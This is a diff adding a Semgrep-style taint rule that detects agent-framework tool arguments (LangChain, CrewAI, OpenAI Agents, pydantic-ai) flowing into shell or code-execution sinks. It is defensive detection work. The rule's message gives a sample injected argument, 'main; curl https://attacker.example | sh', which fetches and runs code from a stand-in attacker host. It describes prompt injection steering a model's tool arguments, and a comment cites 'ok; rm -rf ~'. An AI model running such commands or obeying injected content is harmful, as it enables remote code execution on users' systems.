@@ -1,0 +1,421 @@
+rules:
+  - id: agent-tool-arg-to-shell
+    # Agent-framework sibling of mcp-tool-arg-to-shell: the same shell and code-execution
+    # sinks and sanitizers (build.py SHARED_BLOCKS keeps them identical), with an agent
+    # framework's tool function as the source. Sources: langchain-core 1.6.13 (@tool,
+    # StructuredTool.from_function, BaseTool._run/_arun), openai-agents 0.24.0
+    # (@function_tool), pydantic-ai 2.59.0 (@agent.tool, @agent.tool_plain, Tool(fn),
+    # Agent(tools=[fn])), crewai 1.15.28 (@tool, BaseTool._run). The pattern-sources block is
+    # shared with agent-tool-arg-option-injection and agent-tool-arg-to-sql: edit them
+    # together.
+    languages: [python]
+    severity: ERROR
+    message: >-
+      An agent tool argument reaches a shell or code-execution sink. The model chooses every
+      tool argument, and a prompt injection in anything it has read (a web page, an issue, a
+      document, another tool's result) can choose them for it, so an argument like
+      `main; curl https://attacker.example | sh` runs as a command wherever the agent runs.
+      Pass an argument list without a shell (`subprocess.run(["git", "log", "--", ref])`),
+      constrain the parameter's type (`Literal[...]`, `int`), or quote it with
+      `shlex.quote()` when a shell is unavoidable; never evaluate it as code.
+    mode: taint
+    pattern-sources:
+      # A tool function's parameters, which the model fills in. Parameters typed int, float,
+      # bool, Literal[...] (or an alias of one assigned earlier in the file), a framework
+      # context (RunContext, RunContextWrapper, ToolContext,
+      # ToolRuntime, RunnableConfig), an Injected* argument the application supplies, or a
+      # string constrained by an anchored pattern (Field(pattern=r"^...$")) are skipped: the
+      # frameworks validate arguments against the annotation with pydantic before the call.
+      - patterns:
+          - pattern-either:
+              # LangChain @tool (langchain_core.tools, re-exported by langchain.tools and,
+              # before 1.0, langchain.agents), CrewAI @tool, OpenAI Agents SDK @function_tool.
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          @$DEC
+                          def $F(...): ...
+                      - pattern-inside: |
+                          @$DEC(...)
+                          def $F(...): ...
+                  - metavariable-pattern:
+                      metavariable: $DEC
+                      pattern-either:
+                        - pattern: langchain_core.tools.tool
+                        - pattern: langchain.tools.tool
+                        - pattern: langchain.agents.tool
+                        - pattern: crewai.tools.tool
+                        - pattern: agents.function_tool
+              # pydantic-ai: @agent.tool takes a RunContext first (pydantic-ai rejects a
+              # context tool without one, and no MCP server SDK uses RunContext), and
+              # @agent.tool_plain. mcp-tool-arg-to-shell skips the RunContext form.
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          @$AGENT.tool
+                          def $F(...): ...
+                      - pattern-inside: |
+                          @$AGENT.tool(...)
+                          def $F(...): ...
+                  - pattern-either:
+                      - pattern-inside: |
+                          def $F($CTX: pydantic_ai.RunContext, ...): ...
+                      - pattern-inside: |
+                          def $F($CTX: pydantic_ai.RunContext[...], ...): ...
+              - pattern-inside: |
+                  @$AGENT.tool_plain
+                  def $F(...): ...
+              - pattern-inside: |
+                  @$AGENT.tool_plain(...)
+                  def $F(...): ...
+              # A plain function registered later in the file: StructuredTool.from_function(f),
+              # Tool.from_function(func=f), function_tool(f), pydantic_ai.Tool(f),
+              # Agent(tools=[f]), create_agent(model, tools=[f]), ToolNode([f]),
+              # llm.bind_tools([f]), in a file that imports an agent framework. The regex covers
+              # the def (decorators, signature, and indented body) and looks ahead for a call to
+              # one of those names with F among its top-level arguments (bare, in a list, or as a
+              # keyword's value); its F group must name the def below. A statement region from
+              # each def to a later registration took 257 s on a 4,000-function file (OpenGrep
+              # 1.30.2); the regex scans the rest of the file once per def, 5 s there. A paren
+              # not preceded by e, l, n, s, or t can't end a registration callee, so the scan steps
+              # over it before trying the callee names (20 s without that). The callee is matched
+              # by name, so the import region stands in for resolving it; an MCP
+              # add_tool(Tool.from_function(f)) is mcp-tool-arg-to-shell's.
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          import $MOD
+                          ...
+                      - pattern-inside: |
+                          from $MOD import $NAME
+                          ...
+                  - metavariable-regex:
+                      metavariable: $MOD
+                      regex: ^(?:langchain\w*|langgraph|agents|crewai|pydantic_ai)(?:\.|$)
+                  - pattern-regex: >-
+                      (?m)^(?<IND>[ \t]*+)(?:@[^\n]*+\n\k<IND>)*+(?:async[ \t]++)?def[ \t]++(?<F>\w++)\b[^\n]*+(?:\n(?:\k<IND>[ \t)\]][^\n]*+|[ \t]*+(?:\#[^\n]*+)?(?=\n|\z)))*+(?=(?:[^(]++|(?<![elnst])\(|(?<=add_tool|add_prompt|add_template)\(\s*+[\w.]*\.from_function\(|(?<!\.from_function|\bfunction_tool|\btool|\bTool|\bAgent|\bcreate_agent|\bcreate_react_agent|\bToolNode|\.bind_tools)\(|\((?!(?:[^()"'\w]++|(?:"(?:[^"\\\n]|\\.)*+"|'(?:[^'\\\n]|\\.)*+'|["'])|(?&pa)|(?!\k<F>\b(?!\s*+[(=]))\w++)*+\k<F>\b(?!\s*+[(=])))*+(?<=\.from_function|\bfunction_tool|\btool|\bTool|\bAgent|\bcreate_agent|\bcreate_react_agent|\bToolNode|\.bind_tools)\((?:[^()"'\w]++|(?:"(?:[^"\\\n]|\\.)*+"|'(?:[^'\\\n]|\\.)*+'|["'])|(?&pa)|(?!\k<F>\b(?!\s*+[(=]))\w++)*+\k<F>\b(?!\s*+[(=]))(?(DEFINE)(?<pa>\((?:[^()"']++|(?:"(?:[^"\\\n]|\\.)*+"|'(?:[^'\\\n]|\\.)*+'|["'])|(?&pa))*+\)))
+              # LangChain and CrewAI BaseTool subclasses: _run / _arun get the arguments.
+              - patterns:
+                  - pattern-inside: |
+                      class $C(..., $BASE, ...):
+                          ...
+                  - metavariable-pattern:
+                      metavariable: $BASE
+                      pattern-either:
+                        - pattern: langchain_core.tools.BaseTool
+                        - pattern: langchain.tools.BaseTool
+                        - pattern: crewai.tools.BaseTool
+                  - pattern-inside: |
+                      def $F(...): ...
+                  - metavariable-regex:
+                      metavariable: $F
+                      regex: ^_a?run$
+          - pattern-either:
+              - patterns:
+                  - pattern: |
+                      def $F(..., $P, ...): ...
+                  - pattern-not: |
+                      def $F(..., $P: $TYPE, ...): ...
+                  - pattern-not: |
+                      def $F(..., $P: $TYPE = $DEFAULT, ...): ...
+              - patterns:
+                  - pattern-either:
+                      - pattern: |
+                          def $F(..., $P: $TYPE, ...): ...
+                      - pattern: |
+                          def $F(..., $P: $TYPE = $DEFAULT, ...): ...
+                  - metavariable-regex:
+                      metavariable: $TYPE
+                      regex: ^(?!(?:typing\.)?(?:Annotated\[\s*)?(?:int|float|bool|(?:typing\.)?Literal\[|[\w.]*(?:Context|ContextWrapper|ToolRuntime|RunnableConfig)\b|(?:typing\.)?Optional\[[\w.]*CallbackManager)|.*\bInjected\w*|.*\bpattern\s*=\s*r?["']\^.*\$["'])
+                  # A Literal alias assigned earlier in the block (Service = Literal["web", "db"],
+                  # or Service: TypeAlias = ...) is as safe as the Literal written inline.
+                  - pattern-not-inside: |
+                      $TYPE = typing.Literal[...]
+                      ...
+                  - pattern-not-inside: |
+                      $TYPE: $ALIAS_KIND = typing.Literal[...]
+                      ...
+                  - pattern-not-inside: |
+                      $TYPE = typing_extensions.Literal[...]
+                      ...
+                  - pattern-not-inside: |
+                      $TYPE: $ALIAS_KIND = typing_extensions.Literal[...]
+                      ...
+          - metavariable-regex:
+              metavariable: $P
+              regex: ^(?!(?:self|cls|run_manager)$)
+          - focus-metavariable: $P
+    pattern-sanitizers:
+      # An allowlist check before use: re.fullmatch, or re.match / re.search with a pattern
+      # anchored at the end. (A start-only re.match lets "ok; rm -rf ~" through.)
+      - by-side-effect: true
+        patterns:
+          - pattern-either:
+              - pattern: re.fullmatch($PAT, $X, ...)
+              - pattern: $RE.fullmatch($X, ...)
+              - patterns:
+                  - pattern-either:
+                      - pattern: re.match($PAT, $X, ...)
+                      - pattern: re.search($PAT, $X, ...)
+                  - metavariable-regex:
+                      metavariable: $PAT
+                      regex: ^[rRbB]*["'].*(?:\$|\\Z)["']$
+          - focus-metavariable: $X
+      # An allowlist membership check before use: `if unit not in ALLOWED_UNITS: raise`.
+      # (Only the left operand: `";" in value` is a blocklist check and sanitizes nothing.)
+      - by-side-effect: true
+        patterns:
+          - pattern-either:
+              - pattern: $X in $ALLOWED
+              - pattern: $X not in $ALLOWED
+          - focus-metavariable: $X
+      - exact: true
+        pattern: shlex.quote(...)
+      - exact: true
+        pattern: shlex.join(...)
+      - exact: true
+        pattern: pipes.quote(...)
+      - exact: true
+        pattern: int(...)
+      - exact: true
+        pattern: float(...)
+    pattern-sinks:
+      # The code argument only: an argument passed in the globals or locals dict is data.
+      - patterns:
+          - pattern-either:
+              - pattern-inside: eval($CODE, ...)
+              - pattern-inside: exec($CODE, ...)
+              - pattern-inside: compile($CODE, ...)
+          - pattern: $CODE
+      # The command, passed first or by its keyword name (CPython 3.15.2: os.system command=,
+      # os.popen, getoutput, getstatusoutput, and asyncio cmd=; paramiko 4.0.0 command=).
+      - patterns:
+          - pattern-either:
+              - pattern-inside: os.system($CMD, ...)
+              - pattern-inside: os.system(..., command=$CMD, ...)
+              - pattern-inside: os.popen($CMD, ...)
+              - pattern-inside: os.popen(..., cmd=$CMD, ...)
+              - pattern-inside: subprocess.getoutput($CMD, ...)
+              - pattern-inside: subprocess.getoutput(..., cmd=$CMD, ...)
+              - pattern-inside: subprocess.getstatusoutput($CMD, ...)
+              - pattern-inside: subprocess.getstatusoutput(..., cmd=$CMD, ...)
+              - pattern-inside: asyncio.create_subprocess_shell($CMD, ...)
+              - pattern-inside: asyncio.create_subprocess_shell(..., cmd=$CMD, ...)
+              - pattern-inside: asyncio.subprocess.create_subprocess_shell($CMD, ...)
+              - pattern-inside: asyncio.subprocess.create_subprocess_shell(..., cmd=$CMD, ...)
+              - pattern-inside: $LOOP.subprocess_shell($FACTORY, $CMD, ...)
+              - pattern-inside: $LOOP.subprocess_shell(..., cmd=$CMD, ...)
+              # paramiko: the SSH server runs the string in the remote user's shell.
+              - pattern-inside: $SSH.exec_command($CMD, ...)
+              - pattern-inside: $SSH.exec_command(..., command=$CMD, ...)
+          - pattern: $CMD
+      # shell=True: only the command, passed first or as args= (run, call, check_call, and
+      # check_output hand their arguments to Popen(args, ...)). With shell=True, later list
+      # items become the shell's $0, $1, ... and are not parsed as commands.
+      - patterns:
+          - pattern-either:
+              - pattern-inside: subprocess.$FN($CMD, ..., shell=True, ...)
+              - pattern-inside: subprocess.$FN(..., args=$CMD, ..., shell=True, ...)
+          - metavariable-regex:
+              metavariable: $FN
+              regex: ^(run|call|check_call|check_output|Popen)$
+          - pattern: $CMD
+          - pattern-not: '[...]'
+      # anyio runs a str command through the shell and a sequence without one, so only
+      # string-building expressions count, directly or through a name assigned one.
+      - patterns:
+          - pattern-either:
+              - pattern-inside: anyio.run_process($CMD, ...)
+              - pattern-inside: anyio.run_process(..., command=$CMD, ...)
+              - pattern-inside: anyio.open_process($CMD, ...)
+              - pattern-inside: anyio.open_process(..., command=$CMD, ...)
+          - pattern: $CMD
+          - pattern-either:
+              - patterns:
+                  - pattern-inside: |
+                      $CMD = $STR
+                      ...
+                  - metavariable-pattern:
+                      metavariable: $STR
+                      pattern-either:
+                        - pattern: f"..."
+                        - pattern: $A + $B
+                        - pattern: $A % $B
+                        - pattern: $FMT.format(...)
+                        - pattern: $SEP.join(...)
+              - pattern-either:
+                  - pattern: f"..."
+                  - pattern: $A + $B
+                  - pattern: $A % $B
+                  - pattern: $FMT.format(...)
+                  - pattern: $SEP.join(...)
+          - pattern-not: '[...] + $B'
+          - pattern-not: '$A + [...]'
+      # An argv that starts a shell on the next item: ["bash", "-c", cmd], ("sh", "-lc", cmd),
+      # ["cmd.exe", "/c", cmd], or the same items passed positionally
+      # (asyncio.create_subprocess_exec("sh", "-c", cmd), os.execlp("sh", "sh", "-c", cmd)).
+      - patterns:
+          - pattern-either:
+              - pattern: '[..., $SH, $FLAG, $CMD, ...]'
+              - pattern: '(..., $SH, $FLAG, $CMD, ...)'
+              - pattern: $EXEC(..., $SH, $FLAG, $CMD, ...)
+          - metavariable-regex:
+              metavariable: $SH
+              regex: ^["'](?:[\w./-]*/)?(?:(?:ba|da|z|k|fi|c|tc)?sh|cmd(?:\.exe)?|powershell(?:\.exe)?|pwsh)["']$
+          - metavariable-regex:
+              metavariable: $FLAG
+              regex: ^["'](?:-[a-zA-Z]*c[a-zA-Z]*|/[cCkK]|-(?i:command))["']$
+          - focus-metavariable: $CMD
+      # The last two sinks are also shared with llm-output-to-code-execution (build.py
+      # SHARED_BLOCKS).
+      # An argv that starts an interpreter on inline code: [sys.executable, "-c", code],
+      # ["node", "-e", code], ("deno", "eval", code), or the same items passed positionally.
+      # Each interpreter is paired with its own eval flag, so `node -c` (syntax check) doesn't
+      # count.
+      # The eval flag comes right after the interpreter or after one option that takes no
+      # value ([sys.executable, "-I", "-c", code]).
+      - patterns:
+          - pattern-either:
+              - pattern: '[..., $BIN, $FLAG, $CODE, ...]'
+              - pattern: '(..., $BIN, $FLAG, $CODE, ...)'
+              - pattern: $EXEC(..., $BIN, $FLAG, $CODE, ...)
+              - patterns:
+                  - pattern-either:
+                      - pattern: '[..., $BIN, $OPT, $FLAG, $CODE, ...]'
+                      - pattern: '(..., $BIN, $OPT, $FLAG, $CODE, ...)'
+                      - pattern: $EXEC(..., $BIN, $OPT, $FLAG, $CODE, ...)
+                  - metavariable-regex:
+                      metavariable: $OPT
+                      regex: ^["'](?:-(?![WXmr]["'])[a-zA-Z]{1,3}|--[a-z][\w-]*(?<!require)(?<!import)(?<!loader))["']$
+          - metavariable-comparison:
+              comparison: >-
+                ((re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:python[0-9.]*|py)(?:[.]exe)?$", str($BIN))
+                or str($BIN) == "sys.executable")
+                and str($FLAG) == "-c")
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:node|nodejs|bun|tsx|ts-node)(?:[.]exe)?$", str($BIN))
+                and re.match("^(?:-e|--eval|-p|--print|-pe)$", str($FLAG)))
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?deno(?:[.]exe)?$", str($BIN)) and str($FLAG) == "eval")
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:ruby|perl)(?:[.]exe)?$", str($BIN)) and re.match("^-[eE]$", str($FLAG)))
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?php(?:[.]exe)?$", str($BIN)) and str($FLAG) == "-r")
+          - focus-metavariable: $CODE
+      # Code written to a file and then run in the same function: path.write_text(code) or
+      # `with open(path, "w") as f: f.write(code)` (or a NamedTemporaryFile), and later
+      # subprocess.run([sys.executable, str(path)]), create_subprocess_exec("bash", path),
+      # runpy.run_path(path), or spec_from_file_location(name, path). Only the written contents
+      # count; a file handed to a program that only reads it (git, a linter) doesn't. The argv
+      # list may also be passed by keyword (subprocess args=, anyio command=).
+      - patterns:
+          - pattern-either:
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          $PATH.write_text($CODE, ...)
+                          ...
+                          $RUN([$BIN, ..., <... $PATH ...>, ...], ...)
+                      - pattern-inside: |
+                          $PATH.write_text($CODE, ...)
+                          ...
+                          $RUN(..., $KW=[$BIN, ..., <... $PATH ...>, ...], ...)
+                      - pattern-inside: |
+                          $PATH.write_text($CODE, ...)
+                          ...
+                          $RUN($BIN, ..., <... $PATH ...>, ...)
+                      - pattern-inside: |
+                          with open($PATH, ...) as $F:
+                              ...
+                          ...
+                          $RUN([$BIN, ..., <... $PATH ...>, ...], ...)
+                      - pattern-inside: |
+                          with open($PATH, ...) as $F:
+                              ...
+                          ...
+                          $RUN(..., $KW=[$BIN, ..., <... $PATH ...>, ...], ...)
+                      - pattern-inside: |
+                          with open($PATH, ...) as $F:
+                              ...
+                          ...
+                          $RUN($BIN, ..., <... $PATH ...>, ...)
+                      - patterns:
+                          - pattern-either:
+                              - pattern-inside: |
+                                  with $TMP(...) as $F:
+                                      ...
+                                  ...
+                                  $RUN([$BIN, ..., <... $F.name ...>, ...], ...)
+                              - pattern-inside: |
+                                  with $TMP(...) as $F:
+                                      ...
+                                  ...
+                                  $RUN(..., $KW=[$BIN, ..., <... $F.name ...>, ...], ...)
+                              - pattern-inside: |
+                                  with $TMP(...) as $F:
+                                      ...
+                                  ...
+                                  $RUN($BIN, ..., <... $F.name ...>, ...)
+                          - metavariable-regex:
+                              metavariable: $TMP
+                              regex: ^(?:tempfile\.)?NamedTemporaryFile$
+                  - metavariable-regex:
+                      metavariable: $BIN
+                      regex: ^(?:["'](?:[\w./-]*/)?(?:python[\d.]*|py|node|nodejs|deno|bun|ruby|perl|php|(?:ba|da|z|k|fi|c|tc)?sh|pwsh|powershell)(?:\.exe)?["']|sys\.executable)$
+                  - metavariable-regex:
+                      metavariable: $RUN
+                      regex: ^(?:subprocess\.(?:run|call|check_call|check_output|Popen)|(?:asyncio\.)?create_subprocess_exec|anyio\.(?:run_process|open_process)|os\.(?:exec|spawn)\w*)$
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          $PATH.write_text($CODE, ...)
+                          ...
+                          $LOAD(..., <... $PATH ...>, ...)
+                      - pattern-inside: |
+                          with open($PATH, ...) as $F:
+                              ...
+                          ...
+                          $LOAD(..., <... $PATH ...>, ...)
+                      - patterns:
+                          - pattern-inside: |
+                              with $TMP(...) as $F:
+                                  ...
+                              ...
+                              $LOAD(..., <... $F.name ...>, ...)
+                          - metavariable-regex:
+                              metavariable: $TMP
+                              regex: ^(?:tempfile\.)?NamedTemporaryFile$
+                  - metavariable-regex:
+                      metavariable: $LOAD
+                      regex: ^(?:runpy\.run_path|(?:importlib\.util\.)?spec_from_file_location)$
+          # The written contents themselves, not a later use of the same name.
+          - pattern-either:
+              - pattern-inside: $PATH.write_text($CODE, ...)
+              - pattern-inside: $F.write($CODE)
+          - pattern: $CODE
+    metadata:
+      category: security
+      subcategory: [vuln]
+      pack-category: ai-code
+      owasp-llm:
+        - "LLM10:2026 - Improper Output Handling"
+        - "LLM05:2025 - Improper Output Handling"
+      owasp-agentic:
+        - "ASI05 - Unexpected Code Execution (RCE)"
+        - "ASI02 - Tool Misuse and Exploitation"
+      owasp-aisvs:
+        - "v1.01-C7.1.1 - Output Format Enforcement"
+        - "v1.01-C9.3.1 - Component Isolation and Tool Authorization"
+      mitre-atlas:
+        - "AML.T0053 - AI Agent Tool Invocation"
+        - "AML.T0050 - Command and Scripting Interpreter"
+      cwe:
+        - "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+        - "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+      confidence: HIGH
+      likelihood: MEDIUM
+      impact: HIGH
+      technology: [langchain, crewai, openai-agents, pydantic-ai]
+      references:
+        - https://github.com/langchain-ai/langchain/blob/langchain-core%3D%3D1.6.13/libs/core/langchain_core/tools/convert.py
+        - https://github.com/langchain-ai/langchain/blob/langchain-core%3D%3D1.6.13/libs/core/langchain_core/tools/structured.py
+        - https://github.com/openai/openai-agents-python/blob/v0.24.0/src/agents/tool.py
+        - https://github.com/pydantic/pydantic-ai/blob/v2.59.0/pydantic_ai_slim/pydantic_ai/toolsets/function.py
+        - https://github.com/crewAIInc/crewAI/blob/1.15.28/lib/crewai/src/crewai/tools/base_tool.py
+        - https://cwe.mitre.org/data/definitions/78.html
